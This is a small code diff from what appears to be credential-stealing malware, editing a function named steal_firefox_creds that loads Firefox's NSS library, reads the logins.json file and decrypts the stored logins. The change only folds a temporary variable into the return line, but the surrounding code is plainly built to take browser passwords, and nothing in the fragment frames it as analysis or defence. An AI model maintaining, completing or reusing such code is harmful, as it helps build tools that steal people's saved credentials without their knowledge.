@@ -120,5 +120,4 @@ def steal_firefox_creds(): # get firefox credentials
     __nss3_init(nss3)
     __set_nss3_attr_and_res(nss3)
     logins = __get_logins_from_loginsjson_file()
-    decrypted_logins = __decrypt_firefox_creds(nss3, logins)
-    return decrypted_logins
+    return __decrypt_firefox_creds(nss3, logins)
